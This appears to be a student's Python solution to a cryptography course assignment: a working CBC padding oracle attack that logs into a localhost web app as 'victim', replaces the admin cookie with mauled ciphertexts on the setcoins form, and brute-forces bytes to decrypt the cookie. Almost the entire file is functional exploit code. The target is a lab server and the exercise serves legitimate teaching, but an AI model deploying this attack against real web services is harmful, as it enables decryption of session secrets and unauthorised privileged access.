import os
import sys
from cryptography.hazmat.primitives import hashes, padding, ciphers
from cryptography.hazmat.backends import default_backend
from requests import codes, Session

import base64
import binascii


LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"

def do_login_form(sess, username,password):
	data_dict = {"username":username,\
			"password":password,\
			"login":"Login"
			}
	response = sess.post(LOGIN_FORM_URL,data_dict)
	return response.status_code == codes.ok

def do_setcoins_form(sess,uname, coins):
	data_dict = {"username":uname,\
			"amount":str(coins),\
			}
	response = sess.post(SETCOINS_FORM_URL, data_dict)
	return response

#You should implement this padding oracle object
#to craft the requests containing the mauled
#ciphertexts to the right URL.
class PaddingOracle(object):

    def __init__(self, po_url):
        self.url = po_url
        self._block_size_bytes = 16

    @property
    def block_length(self):
        return self._block_size_bytes

    #you'll need to send the provided ciphertext
    #as the admin cookie, retrieve the request,
    #and see whether there was a padding error or not.
    def test_ciphertext(self, ct):
        sess = Session()
        uname ="victim"
        pw = "victim"
        assert(do_login_form(sess, uname,pw))
        del sess.cookies['admin']
        sess.cookies.set('admin', ct)
        res = do_setcoins_form(sess, uname, 5000)
        success_msg = "Missing admin privilege."
        if success_msg in res.text:
            return True
        return False

def split_into_blocks(msg, l):
    while msg:
        yield msg[:l]
        msg = msg[l:]
    
def po_attack_2blocks(po, ctx):
    """Given two blocks of cipher texts, it can recover the first block of
    the message.
    @po: an instance of padding oracle. 
    @ctx: a ciphertext 
    """
    assert len(ctx) == 2*po.block_length, "This function only accepts 2 block "\
        "cipher texts. Got {} block(s)!".format(len(ctx)/po.block_length)
    c0, c1 = list(split_into_blocks(ctx, po.block_length))
    msg = ''
    # TODO: Implement padding oracle attack for 2 blocks of messages.

    # init the block we are going to decrypt as 000...000
    current_decrypted_block = bytearray([0] * po.block_length)
    iv = c0 # the initial vector, we are going to bruteforce mutate this until finding the correct padding

    padding = 0
    for i in range(po.block_length, 0, -1):
        padding += 1
        # bruteforce the byte at i-1 position
        for _ in range(256):
            iv = bytearray(iv)
            iv[i-1] = (iv[i-1] + 1) % 256
            joined_encrypted_block = bytes(iv) + c1
            # call oracle to check if the padding is correct
            if (po.test_ciphertext(joined_encrypted_block.hex())):
                # learned the [-padding]-th byte of the decrypted block, which is "i" xor padding, i is (iv[-padding] ^ c0[-padding]) here
                # update current decrypted block
                current_decrypted_block[-padding] = (iv[-padding] ^ c0[-padding]) ^ padding
                # update iv for the next iteration (next padding)
                # set [-k]-th byte to (next_padding) xor intermediate_vector[-k]
                for k in range(1, padding+1):
                    iv[-k] = padding+1 ^ (current_decrypted_block[-k] ^ c0[-k])
                break
    decrypted = bytes(current_decrypted_block)
    return decrypted.decode('ascii')

def po_attack(po, ctx):
    """
    Padding oracle attack that can decrpyt any arbitrary length messags.
    @po: an instance of padding oracle. 
    You don't have to unpad the message.
    """
    ctx_blocks = list(split_into_blocks(ctx, po.block_length))
    nblocks = len(ctx_blocks)
    # TODO: Implement padding oracle attack for arbitrary length message.

    # print(ctx_blocks)
    # print(nblocks)
    msgs = []
    for i in range(nblocks-1):
        msgs.append(po_attack_2blocks(po, ctx_blocks[i] + ctx_blocks[i+1]))
    return msgs

if __name__=='__main__':
    # read admin cookie from cli first argument
    admin_cookie = sys.argv[1]
    # print(admin_cookie)
    # print(bytes.fromhex(sys.argv[1]))
    #You need to implement PaddingOracle class
    po = PaddingOracle("http://localhost:8080/setcoins")
    res = po_attack(po, bytes.fromhex(sys.argv[1]))
    res = ''.join(res)
    print("msg: ", res)
    